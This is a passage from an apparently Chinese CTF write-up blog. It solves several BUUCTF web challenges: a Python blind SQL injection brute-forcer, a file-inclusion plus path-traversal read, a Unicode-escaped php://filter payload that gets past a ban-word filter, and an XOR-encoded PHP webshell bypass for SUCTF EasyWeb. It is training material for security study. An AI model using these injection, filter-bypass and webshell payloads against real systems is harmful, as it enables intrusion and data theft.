</span></span><span class="line"><span class="cl">            <span class="s1">&#39;passwd&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;||(passwd/**/regexp/**/&#34;^</span><span class="si">{</span><span class="n">flag</span> <span class="o">+</span> <span class="n">i</span><span class="si">}</span><span class="s1">&#34;);&#39;</span> <span class="o">+</span> <span class="n">unquote</span><span class="p">(</span><span class="s1">&#39;%00&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;404 Not Found&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">lower</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324205158886.png"
	width="1837"
	height="615"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324205158886_hu1233877924209684791.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250324205158886_hu382011051222534790.png 1024w"
	loading="lazy"
	
		alt="image-20250324205158886"
	
	
		class="gallery-image" 
		data-flex-grow="298"
		data-flex-basis="716px"
	
></p>
<h2 id="ÁΩëÈºéÊùØ-2020-ÂçäÂÜ≥Ëµõalicewebsite">[ÁΩëÈºéÊùØ 2020 ÂçäÂÜ≥Ëµõ]AliceWebsite
</h2><p>index.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$action</span> <span class="o">=</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;home.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$action</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">include</span> <span class="nv">$action</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;File not found!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊúâÊñá‰ª∂ÂåÖÂê´ÔºåÁÑ∂ÂêéÁî®ÁõÆÂΩïÁ©øË∂äËØªÂà∞flag</p>
<h2 id="harekazectf2019encode_and_encode">[HarekazeCTF2019]encode_and_encode
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">is_valid</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$banword</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// no path traversal
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;\.\.&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// no stream wrapper
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// no data exfiltration
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;flag&#39;</span>
</span></span><span class="line"><span class="cl">  <span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="nv">$banword</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$str</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$body</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$json</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$body</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">is_valid</span><span class="p">(</span><span class="nv">$body</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$json</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$json</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$page</span> <span class="o">=</span> <span class="nv">$json</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$content</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_valid</span><span class="p">(</span><span class="nv">$content</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="s2">&#34;&lt;p&gt;not found&lt;/p&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$content</span> <span class="o">=</span> <span class="s1">&#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// no data exfiltration!!!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$content</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/HarekazeCTF\{.+\}/i&#39;</span><span class="p">,</span> <span class="s1">&#39;HarekazeCTF{&amp;lt;censored&amp;gt;}&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">json_encode</span><span class="p">([</span><span class="s1">&#39;content&#39;</span> <span class="o">=&gt;</span> <span class="nv">$content</span><span class="p">]);</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>unicodeÁºñÁ†ÅÁªïËøáÊ≠£ÂàôÂåπÈÖçÔºåÂõ†‰∏∫json_decodeÊó∂‰ºöÊääunicodeÁºñÁ†ÅËΩ¨Á†Å</p>
<p>jsonÊ†ºÂºèÁöÑpage‰º†‰º™ÂçèËÆÆËØªflag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;page&#34;:&#34;php://filter/convert.base64-encode/resource=/flag&#34;}
</span></span><span class="line"><span class="cl">{&#34;page&#34;:&#34;\u0070\u0068\u0070\u003A\u002F\u002F\u0066\u0069\u006C\u0074\u0065\u0072\u002F\u0063\u006F\u006E\u0076\u0065\u0072\u0074\u002E\u0062\u0061\u0073\u0065\u0036\u0034\u002D\u0065\u006E\u0063\u006F\u0064\u0065\u002F\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u003D\u002F\u0066\u006C\u0061\u0067&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="suctf-2019easyweb">[SUCTF 2019]EasyWeb
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">get_the_flag</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// webadmin will remove your upload file every 20 min!!!! 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$userdir</span> <span class="o">=</span> <span class="s2">&#34;upload/tmp_&#34;</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$userdir</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$userdir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$tmp_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$extension</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nx">strrpos</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="s2">&#34;.&#34;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/ph/i&#34;</span><span class="p">,</span><span class="nv">$extension</span><span class="p">))</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;^_^&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">mb_strpos</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">),</span> <span class="s1">&#39;&lt;?&#39;</span><span class="p">)</span><span class="o">!==</span><span class="k">False</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;^_^&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">exif_imagetype</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">))</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;^_^&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">        <span class="nv">$path</span><span class="o">=</span> <span class="nv">$userdir</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">,</span> <span class="nv">$path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">print_r</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$hhh</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$hhh</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$hhh</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">18</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;One inch long, one inch strong!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[\x00- 0-9A-Za-z\&#39;&#34;\`~_&amp;.,|=[\x7F]+/i&#39;</span><span class="p">,</span> <span class="nv">$hhh</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Try something else!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$character_type</span> <span class="o">=</span> <span class="nx">count_chars</span><span class="p">(</span><span class="nv">$hhh</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$character_type</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">12</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Almost there!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nv">$hhh</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËøáÊª§‰∫ÜÂèñÂèçÁ¨¶Âè∑ÔºåÂè™ËÉΩÂºÇÊàñÊù•ÁªïËøáÂÜôwebshell</p>
<p>ÂºÇÊàñËÑöÊú¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">finds</span><span class="p">(</span><span class="nv">$string</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$a</span><span class="o">=</span><span class="p">[</span><span class="mi">33</span><span class="p">,</span><span class="mi">35</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">63</span><span class="p">,</span><span class="mi">64</span><span class="p">,</span><span class="mi">92</span><span class="p">,</span><span class="mi">93</span><span class="p">,</span><span class="mi">94</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">125</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">134</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">136</span><span class="p">,</span><span class="mi">137</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">140</span><span class="p">,</span><span class="mi">141</span><span class="p">,</span><span class="mi">142</span><span class="p">,</span><span class="mi">143</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">146</span><span class="p">,</span><span class="mi">147</span><span class="p">,</span><span class="mi">148</span><span class="p">,</span><span class="mi">149</span><span class="p">,</span><span class="mi">150</span><span class="p">,</span><span class="mi">151</span><span class="p">,</span><span class="mi">152</span><span class="p">,</span><span class="mi">153</span><span class="p">,</span><span class="mi">154</span><span class="p">,</span><span class="mi">155</span><span class="p">,</span><span class="mi">156</span><span class="p">,</span><span class="mi">157</span><span class="p">,</span><span class="mi">158</span><span class="p">,</span><span class="mi">159</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">161</span><span class="p">,</span><span class="mi">162</span><span class="p">,</span><span class="mi">163</span><span class="p">,</span><span class="mi">164</span><span class="p">,</span><span class="mi">165</span><span class="p">,</span><span class="mi">166</span><span class="p">,</span><span class="mi">167</span><span class="p">,</span><span class="mi">168</span><span class="p">,</span><span class="mi">169</span><span class="p">,</span><span class="mi">170</span><span class="p">,</span><span class="mi">171</span><span class="p">,</span><span class="mi">172</span><span class="p">,</span><span class="mi">173</span><span class="p">,</span><span class="mi">174</span><span class="p">,</span><span class="mi">175</span><span class="p">,</span><span class="mi">176</span><span class="p">,</span><span class="mi">177</span><span class="p">,</span><span class="mi">178</span><span class="p">,</span><span class="mi">179</span><span class="p">,</span><span class="mi">180</span><span class="p">,</span><span class="mi">181</span><span class="p">,</span><span class="mi">182</span><span class="p">,</span><span class="mi">183</span><span class="p">,</span><span class="mi">184</span><span class="p">,</span><span class="mi">185</span><span class="p">,</span><span class="mi">186</span><span class="p">,</span><span class="mi">187</span><span class="p">,</span><span class="mi">188</span><span class="p">,</span><span class="mi">189</span><span class="p">,</span><span class="mi">190</span><span class="p">,</span><span class="mi">191</span><span class="p">,</span><span class="mi">192</span><span class="p">,</span><span class="mi">193</span><span class="p">,</span><span class="mi">194</span><span class="p">,</span><span class="mi">195</span><span class="p">,</span><span class="mi">196</span><span class="p">,</span><span class="mi">197</span><span class="p">,</span><span class="mi">198</span><span class="p">,</span><span class="mi">199</span><span class="p">,</span><span class="mi">200</span><span class="p">,</span><span class="mi">201</span><span class="p">,</span><span class="mi">202</span><span class="p">,</span><span class="mi">203</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">205</span><span class="p">,</span><span class="mi">206</span><span class="p">,</span><span class="mi">207</span><span class="p">,</span><span class="mi">208</span><span class="p">,</span><span class="mi">209</span><span class="p">,</span><span class="mi">210</span><span class="p">,</span><span class="mi">211</span><span class="p">,</span><span class="mi">212</span><span class="p">,</span><span class="mi">213</span><span class="p">,</span><span class="mi">214</span><span class="p">,</span><span class="mi">215</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">217</span><span class="p">,</span><span class="mi">218</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">220</span><span class="p">,</span><span class="mi">221</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">223</span><span class="p">,</span><span class="mi">224</span><span class="p">,</span><span class="mi">225</span><span class="p">,</span><span class="mi">226</span><span class="p">,</span><span class="mi">227</span><span class="p">,</span><span class="mi">228</span><span class="p">,</span><span class="mi">229</span><span class="p">,</span><span class="mi">230</span><span class="p">,</span><span class="mi">231</span><span class="p">,</span><span class="mi">232</span><span class="p">,</span><span class="mi">233</span><span class="p">,</span><span class="mi">234</span><span class="p">,</span><span class="mi">235</span><span class="p">,</span><span class="mi">236</span><span class="p">,</span><span class="mi">237</span><span class="p">,</span><span class="mi">238</span><span class="p">,</span><span class="mi">239</span><span class="p">,</span><span class="mi">240</span><span class="p">,</span><span class="mi">241</span><span class="p">,</span><span class="mi">242</span><span class="p">,</span><span class="mi">243</span><span class="p">,</span><span class="mi">244</span><span class="p">,</span><span class="mi">245</span><span class="p">,</span><span class="mi">246</span><span class="p">,</span><span class="mi">247</span><span class="p">,</span><span class="mi">248</span><span class="p">,</span><span class="mi">249</span><span class="p">,</span><span class="mi">250</span><span class="p">,</span><span class="mi">251</span><span class="p">,</span><span class="mi">252</span><span class="p">,</span><span class="mi">253</span><span class="p">,</span><span class="mi">254</span><span class="p">,</span><span class="mi">255</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">27</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">count</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		<span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">27</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="nx">count</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span><span class="nv">$j</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$x</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$a</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">			<span class="k">for</span><span class="p">(</span><span class="nv">$k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$k</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span><span class="nv">$k</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$string</span><span class="p">[</span><span class="nv">$k</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$x</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">					<span class="k">echo</span> <span class="nv">$string</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">					<span class="k">echo</span> <span class="s1">&#39;%&#39;</span> <span class="o">.</span> <span class="nx">dechex</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;^%&#39;</span> <span class="o">.</span> <span class="nx">dechex</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">					<span class="nv">$index</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">					<span class="k">if</span><span class="p">(</span><span class="nv">$index</span> <span class="o">==</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">						<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">					<span class="p">}</span>
</span></span><span class="line"><span class="cl">				<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">finds</span><span class="p">(</span><span class="s2">&#34;_GET&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
